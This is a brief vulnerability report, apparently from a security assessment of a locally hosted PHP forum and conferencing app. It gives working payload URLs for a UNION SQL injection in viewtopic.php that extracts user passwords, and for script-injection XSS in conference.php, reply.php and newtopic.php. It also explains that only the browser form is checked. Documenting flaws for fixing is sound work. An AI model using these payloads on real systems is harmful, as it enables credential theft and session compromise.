1) SQLi in conversation area:
Firstly this page shows SQL error (NEEDS TO BE FIXED)


type the following url

http://localhost:8001/modules/phpbb/viewtopic.php?topic=' union select user_password as topic_title, 1 from users-- &forum=1')--&2

and you'll get the password of the first line of this query

select user_password as topic_title, 1 from users

this vuln is created at file modules/phpbb/viewtopic.php at lines 87-120 


2. XSS Vuln

http://localhost:8001/modules/conference/conference.php

Anything script-like will be xxs vuln


3. XSS Vuln
This is a vuln that exists in the replication to an existing thread message: 

http://localhost:8001/modules/phpbb/reply.php?Dialog1=on&Dialog2=on&Dialog3=on&Dialog4=on&Dialog5=on&Dialog6=on&message=%3Cscript%3Ealert(1)%3C/script%3E%3B%0D%0A%0D%0A&forum=1&topic=7&quote=&submit=%CE%A5%CF%80%CE%BF%CE%B2%CE%BF%CE%BB%CE%AE

this is the vuln
message=%3Cscript%3Ealert(1)%3C/script%3E

change the &topic

This happens because reply.php checks the form in the browser for script-tags but not the actual variable "message". THIS MIGHT BE A GOOD POINT TO START 


4. XSS Vuln 

THis is an vuln that exists during the creation of the thread: Once again the app does not sanitize  the URL "message" variable and ONLY THE FORM.

for example check the following link:

http://localhost:8001/modules/phpbb/newtopic.php?subject=test&Dialog1=on&Dialog2=on&Dialog3=on&Dialog4=on&Dialog5=on&Dialog6=on&message=%3Cscript%3Ealert(%22XSS%22);%3C/script%3E&forum=1&submit=%CE%A5%CF%80%CE%BF%CE%B2%CE%BF%CE%BB%CE%AE

This is the payload:
message=%3Cscript%3Ealert(%22XSS%22);%3C/script%3E
